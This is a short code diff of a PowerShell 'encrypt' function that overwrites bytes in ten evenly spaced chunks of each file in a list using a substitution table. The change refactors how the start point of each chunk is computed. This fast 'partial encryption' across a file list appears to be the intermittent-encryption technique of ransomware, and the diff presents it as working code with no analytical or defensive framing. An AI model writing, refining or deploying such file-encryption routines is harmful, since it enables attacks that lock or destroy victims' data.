@@ -16,19 +16,18 @@ Function encrypt($keyNums, $fileList)
         $fileBytes = [System.IO.File]::ReadAllBytes($fileList[$i])
         
         #Even partial encryption algo
-        $writeEvery = [Math]::Floor($fileBytes.Length/10)#increase amount to write bytes
 
-        $k = 0
+        $k = 0 #start point to write bytes
         foreach($j in 1..10)
         { 
             $lim = 0
             $eachWrite = 100000
-            if(($k + $eachWrite) -ge $fileBytes.Length){$lim = $fileBytes.Length}else{$lim = $k + $eachWrite}
+            if(($k + $eachWrite) -ge $fileBytes.Length) {$lim = $fileBytes.Length} else {$lim = $k + $eachWrite}
             foreach($k in $k..($lim-1))
             {
-                $fileBytes[$k] = $keyNums[$fileBytes[$k]]#shift bytes  
+                $fileBytes[$k] = $keyNums[$fileBytes[$k]] #shift bytes  
             }
-            $k = $writeEvery * $j
+            $k = [Math]::Floor($fileBytes.Length/10) * $j #change start point to next 10%
         }
         
 
